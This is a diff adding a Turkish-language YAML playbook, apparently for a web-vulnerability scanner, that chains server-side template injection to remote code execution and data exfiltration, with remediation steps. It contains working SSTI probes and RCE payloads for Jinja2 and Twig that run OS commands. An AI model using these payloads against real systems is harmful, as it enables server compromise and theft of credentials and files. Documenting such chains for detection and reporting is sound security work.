@@ -1,0 +1,36 @@
+# WebSecure Playbook — SSTI → RCE → Veri Sızdırma Zinciri
+name: "SSTI → RCE → Veri Sızdırma"
+chain_id: "ssti_rce_data_exfil"
+severity: "Critical"
+confidence: "High"
+priority: 8
+
+required_types:
+  - ssti
+  - rce
+
+steps:
+  - type: ssti
+    label: "Server-Side Template Injection (SSTI)"
+    description: >
+      Template motoru kullanıcı girdisini yorumluyor.
+      Payload: `{{7*7}}` → `49` (Jinja2), `${7*7}` → `49` (FreeMarker),
+      `<%= 7*7 %>` → `49` (ERB).
+
+  - type: rce
+    label: "Remote Code Execution"
+    description: >
+      SSTI exploit zinciriyle OS komutu çalıştırılıyor.
+      Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}`
+      Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+
+impact: >
+  SSTI motordan RCE elde edilerek sunucuda keyfi komut çalıştırılır.
+  /etc/passwd, SSH anahtarları, uygulama konfigürasyonu, veritabanı credentials
+  ve tüm hassas veriler sızdırılır. Kalıcı erişim (backdoor) kurulabilir.
+
+remediation: |
+  1. Kullanıcı girdisini template'e hiçbir zaman doğrudan geçirmeyin.
+  2. Template sandbox modunu etkinleştirin.
+  3. Minimum ayrıcalıklı kullanıcı ile uygulamayı çalıştırın.
+  4. Çıkış encoding ile template render edin.
